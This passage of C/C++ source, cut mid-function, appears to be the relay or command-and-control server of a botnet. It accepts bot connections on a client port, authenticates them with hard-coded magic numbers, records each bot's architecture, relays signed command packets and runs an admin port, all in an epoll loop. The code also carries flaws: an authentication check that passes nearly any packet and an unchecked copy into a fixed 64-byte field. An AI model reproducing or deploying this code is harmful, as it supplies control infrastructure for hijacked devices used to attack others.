    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);
    if(b1 != 66 && b2 != 51 && b3 != 99 && b4 != 456 && b5 != 764 && b6 != 73)
    {
        return;
    }
    buf = data->buf;
    len = *(uint16_t *)buf;
    len = ntohs(len);
    if(len > sizeof(data->buf))
    {
        return;
    }
    buf += sizeof(uint16_t);
    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, buf, client_list[es->data.fd].arch_len);
    client_list[es->data.fd].authenticated = TRUE;
    printf("\033[37;1m[\033[32;1m+\033[37;1m] (\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m:\033[32;1m%s\033[37;1m) Connection accepted\033[32;1m!\033[0m\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch);
    return;
}

static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);
    if(b1 == 6967 && b2 == 1011 && b3 == 9699 && b4 == 6464 && b5 == 7784 && b6 == 6866)
    {
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }
    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;
    memset(&data, 0, sizeof(struct relay));
    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        printf("\033[37;1m[\033[31;1m-\033[37;1m] (\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m:\033[31;1m%s\033[37;1m) Connection terminated\033[31;1m!\033[0m\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch);
        terminate_client(es->data.fd);
        return;
    }
    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }
    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }
    if(client_list[es->data.fd].connected == FALSE)
    {
    	return;
    }
    errno = 0;
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);
    if(len <= 0)
    {
        printf("\033[37;1m[\033[31;1m-\033[37;1m] (\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m:\033[31;1m%s\033[37;1m) Disconnected due to bad recv\033[31;1m!\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch);
        terminate_client(es->data.fd);
        return;
    }
    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data);
    }
    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }
    client_list[es->data.fd].timeout = time(NULL);
    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }
    return;
}

static void *client_timeout(void *arg)
{
    int i = 0;
    while(TRUE)
    {
        for(i = 0; i < MAX_EVENTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
            {
                continue;
            }
            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                printf("\033[37;1m[\033[31;1m-\033[37;1m] (\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m.\033[31;1m%d\033[37;1m:\033[31;1m%s\033[37;1m) Connection timed out\033[31;1m!\033[0m\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff, client_list[i].arch);
                terminate_client(client_list[i].fd);
                continue;
            }
        }
        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);
    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }
    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }
    return;
}

static void epoll_handler(void)
{
    struct epoll_event client_event;
    struct epoll_event admin_event;
    int ret = -1;
    struct epoll_event *es;
    int x = 0;
    pthread_t client_timeout_thread;
    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }
    client_event.data.fd = client_fd;
    client_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    admin_event.data.fd = admin_fd;
    admin_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    client_list = (struct clients *)calloc(MAX_EVENTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }
    for(x = 0; x < MAX_EVENTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, 64);
    }
    es = (struct epoll_event *)calloc(MAX_EVENTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);
    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;
        n = epoll_wait(efd, es, MAX_EVENTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }
        for(i = 0; i < n; i++)
        {
            process_event(&es[i], efd);
        }
    }
    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

int main(void)
{
    std::cout << "\033[37;1mStarted\033[38;5;220m.\033[0m" << std::endl;
    client_bind();
    admin_bind();
    epoll_handler();
    return 0;
}
